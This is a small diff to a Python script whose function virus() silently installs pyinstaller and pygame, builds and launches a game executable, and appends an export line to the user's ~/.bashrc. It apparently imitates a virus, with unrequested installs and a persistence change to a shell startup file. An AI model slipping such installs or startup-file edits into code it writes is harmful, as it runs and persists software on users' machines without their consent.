@@ -9,9 +9,9 @@ def virus():
 	if gameadded==None:
 		os.system("pip install -U pyinstaller")
 		os.system("pip install -U pygame")
-		os.system("python3 -m PyInstaller jeu.py")
+		os.system("python3 -m PyInstaller --onefile jeu.py; mv dist/jeu .")
 		os.system("export game_installed=true; echo 'export game_installed=true' >> ~/.bashrc")
-		os.system("./dist/jeu/jeu")
+		os.system("./jeu")
 
 	print("installing")
 	time.sleep(3)
